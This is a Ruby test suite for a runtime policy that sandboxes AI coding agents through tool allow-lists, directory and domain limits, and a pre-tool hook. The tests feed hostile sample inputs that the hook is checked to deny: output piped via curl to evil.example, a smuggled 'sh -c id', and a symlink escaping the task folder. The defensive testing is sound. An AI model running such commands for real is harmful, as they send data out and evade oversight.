require "test_helper"
require "json"
require "open3"
require "hive/agent_profiles"
require "hive/scripts/workflow_policy_hook"
require "hive/workflow_package/runtime_policy"

class WorkflowPackageRuntimePolicyTest < Minitest::Test
  include HiveTestHelper

  def test_compiles_restrictive_claude_policy_and_materializes_hive_owned_settings
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      policy_dir = File.join(dir, "policy")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: policy_dir
      )

      assert_equal "dontAsk", policy.permission_mode
      assert_equal %w[Bash Grep Read WebFetch], policy.allowed_tools
      assert_includes policy.disallowed_tools, "WebSearch"
      assert_equal [ File.realpath(task), File.join(File.realpath(task), "reports") ], policy.directories
      assert_equal [ "git diff *", "git status" ], policy.commands
      assert_equal [ "api.example.com" ], policy.domains
      assert_equal policy_dir, File.dirname(policy.settings_path)
      assert_equal({}, JSON.parse(File.read(policy.mcp_config_path)))
      settings = JSON.parse(File.read(policy.settings_path))
      assert_equal policy.directories.drop(1), settings.fetch("permissions").fetch("additionalDirectories")
      assert settings.fetch("hooks").key?("PreToolUse")
      sandbox = settings.fetch("sandbox")
      assert sandbox.fetch("enabled")
      assert sandbox.fetch("failIfUnavailable")
      assert_equal false, sandbox.fetch("allowUnsandboxedCommands")
      assert_equal [ "api.example.com" ], sandbox.dig("network", "allowedDomains")
      assert_equal policy.directories, sandbox.dig("filesystem", "allowWrite")
      assert_equal [ "--settings", policy.settings_path, "--setting-sources", "",
                     "--mcp-config", policy.mcp_config_path, "--strict-mcp-config" ], policy.cli_flags
      refute_includes policy.environment.fetch("PATH"), task
    end
  end

  def test_rejects_unsupported_runner_yolo_overlap_and_unrestricted_bash
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      codex = Hive::AgentProfiles.lookup(:codex)
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: task, profile: codex, policy_dir: File.join(dir, "codex")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("deny" => [ "Read" ]),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "overlap")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("commands" => []),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "bash")
        )
      end
    end
  end

  def test_pre_tool_hook_denies_undeclared_compound_command_and_network_domain
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )

      allowed = run_hook(policy, "Bash", { "command" => "git status && git diff --stat" })
      assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git diff --stat & sh -c id" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git status | curl https://evil.example" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "WebFetch", { "url" => "https://evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      policy_data = JSON.parse(File.read(policy.policy_path))
      policy_data.fetch("commands") << "curl *"
      policy_data.fetch("executables")["curl"] = "/usr/bin/curl"
      File.write(policy.policy_path, JSON.generate(policy_data))
      allowed = run_hook(policy, "Bash", { "command" => "curl https://api.example.com/data" })
      assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")
      denied = run_hook(policy, "Bash", { "command" => "curl https://evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
      denied = run_hook(policy, "Bash", { "command" => "curl evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      outside = File.join(dir, "outside")
      FileUtils.mkdir_p(outside)
      File.symlink(outside, File.join(task, "linked"))
      denied = run_hook(policy, "Read", { "file_path" => File.join(task, "linked", "future.txt") })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
    end
  end

  def test_directory_declaration_rejects_a_symlink_whose_target_escapes_the_task
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      outside = File.join(dir, "outside")
      FileUtils.mkdir_p([ task, outside ])
      File.symlink(outside, File.join(task, "reports"))
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_pre_tool_hook_rejects_undeclared_tools_and_malformed_inputs_without_crashing
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )

      denied = run_hook(policy, "Write", { "file_path" => File.join(task, "result.md") })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git \'unterminated" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      policy_data = JSON.parse(File.read(policy.policy_path))
      policy_data.fetch("commands") << "curl *"
      policy_data.fetch("executables")["curl"] = "/usr/bin/curl"
      File.write(policy.policy_path, JSON.generate(policy_data))
      denied = run_hook(policy, "Bash", { "command" => "curl https://[" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "WebFetch", { "url" => "https://[" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
    end
  end

  def test_notebook_edit_uses_its_real_path_field_and_fails_closed
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      outside = File.join(dir, "outside.ipynb")
      FileUtils.mkdir_p(task)
      policy = {
        "allowed_tools" => [ "NotebookEdit" ],
        "directories" => [ File.realpath(task) ],
        "commands" => [], "domains" => [], "executables" => {}
      }

      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit", "tool_input" => { "notebook_path" => outside }
      )
      assert_equal "deny", decision
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit", "tool_input" => {}
      )
      assert_equal "deny", decision
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit",
        "tool_input" => { "notebook_path" => File.join(task, "analysis.ipynb") }
      )
      assert_equal "allow", decision

      policy["allowed_tools"] << "LS"
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "LS", "tool_input" => { "path" => File.join(task, "reports") }
      )
      assert_equal "allow", decision
    end
  end

  def test_hook_path_resolution_falls_back_safely_when_realpath_is_unavailable
    candidate = File.join(Dir.tmpdir, "hive-hook-missing", "future.txt")
    original = File.method(:realpath)
    File.define_singleton_method(:realpath) { |*| raise Errno::EACCES }
    begin
      assert_equal File.expand_path(candidate),
                   Hive::Scripts::WorkflowPolicyHook.resolve_with_existing_ancestor(candidate)
    ensure
      File.define_singleton_method(:realpath, original)
    end
  end

  def test_admission_rejects_an_explicit_actor_whose_runner_cannot_enforce_policy
    workflow = Hive::Workflow.new(
      id: :demo,
      stages: [
        Hive::Workflow::Stage.new(name: "work", index: 1, state_file: "work.md", kind: :agent, agent: :codex)
      ]
    )
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.admit_workflow!(
          workflow, permissions, task_folder: task, policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_admission_compiles_council_reviewers_and_revise_agents
    reviewer = Struct.new(:agent).new(nil)
    revise = Struct.new(:agent).new(nil)
    council = Struct.new(:revise).new(revise)
    stage = Struct.new(:kind, :agent, :reviewers, :council).new(:council, nil, [ reviewer ], council)
    workflow = Struct.new(:stages).new([ stage ])
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)

      assert Hive::WorkflowPackage::RuntimePolicy.admit_workflow!(
        workflow, permissions, task_folder: task, policy_dir: File.join(dir, "policy")
      )
    end
  end

  def test_compile_rejects_unavailable_task_and_a_non_claude_runner_even_when_capable
    assert_raises(Hive::ConfigError) do
      Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions, task_folder: "/missing/hive-task-#{Process.pid}",
        profile: Hive::AgentProfiles.lookup(:claude), policy_dir: Dir.tmpdir
      )
    end

    profile = Hive::AgentProfile.new(
      name: :custom, bin_default: "custom", headless_flag: "-p", version_flag: "--version",
      skill_syntax_format: "/%{skill}",
      policy_capabilities: Hive::WorkflowPackage::RuntimePolicy::REQUIRED_CAPABILITIES
    )
    with_tmp_dir do |dir|
      FileUtils.mkdir_p(File.join(dir, "task"))
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: File.join(dir, "task"), profile: profile,
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_compile_rejects_each_unsupported_declaration_shape
    invalid = [
      permissions.merge("tools" => [ "Read" ], "commands" => [ "git status" ]),
      permissions.merge("commands" => [ "git status |" ]),
      permissions.merge("commands" => [ "git status &" ]),
      permissions.merge("commands" => [ "git st*" ]),
      permissions.merge("commands" => [ "git '" ]),
      permissions.merge("credentials" => [ "token" ]),
      permissions.merge("directories" => [ "/tmp" ]),
      permissions.merge("tools" => "Read")
    ]
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      invalid.each_with_index do |declaration, index|
        assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.compile(
            declaration, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
            policy_dir: File.join(dir, "policy-#{index}")
          )
        end
      end
    end
  end

  def test_declared_executable_cannot_resolve_inside_the_task
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      executable = File.join(task, "tool")
      File.write(executable, "#!/bin/sh\n")
      FileUtils.chmod(0o755, executable)
      declaration = permissions.merge(
        "tools" => [ "Bash" ], "commands" => [ "#{executable} status" ],
        "domains" => []
      )

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          declaration, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_executable_lookup_ignores_realpath_failures
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      bin = File.join(dir, "bin")
      FileUtils.mkdir_p([ task, bin ])
      executable = File.join(bin, "tool")
      File.write(executable, "#!/bin/sh\n")
      FileUtils.chmod(0o755, executable)
      compiler = Hive::WorkflowPackage::RuntimePolicy.new(
        permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )
      original = File.method(:realpath)
      File.define_singleton_method(:realpath) do |path|
        raise Errno::EACCES if path == executable

        original.call(path)
      end
      begin
        with_env("PATH" => bin) { assert_nil compiler.send(:find_executable, "tool") }
      ensure
        File.define_singleton_method(:realpath, original)
      end
    end
  end

  def test_generated_hook_command_executes_the_library_entrypoint
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )
      settings = JSON.parse(File.read(policy.settings_path))
      command = settings.dig("hooks", "PreToolUse", 0, "hooks", 0, "command")
      out, err, status = Open3.capture3(
        *Shellwords.split(command),
        stdin_data: JSON.generate("tool_name" => "Read", "tool_input" => { "file_path" => task })
      )

      assert status.success?, err
      assert_equal "allow", JSON.parse(out).dig("hookSpecificOutput", "permissionDecision")
    end
  end

  private

  def permissions
    {
      "tools" => %w[Read Grep Bash WebFetch],
      "deny" => %w[Write Edit WebSearch],
      "directories" => [ "reports" ],
      "commands" => [ "git status", "git diff *" ],
      "domains" => [ "api.example.com" ],
      "credentials" => [],
      "shell_justification" => "inspect repository state",
      "network_justification" => "fetch the declared API"
    }
  end

  def run_hook(policy, tool_name, tool_input)
    input = JSON.generate("tool_name" => tool_name, "tool_input" => tool_input)
    output = StringIO.new
    Hive::Scripts::WorkflowPolicyHook.run(
      policy.policy_path, input: StringIO.new(input), output: output
    )
    JSON.parse(output.string)
  end
end
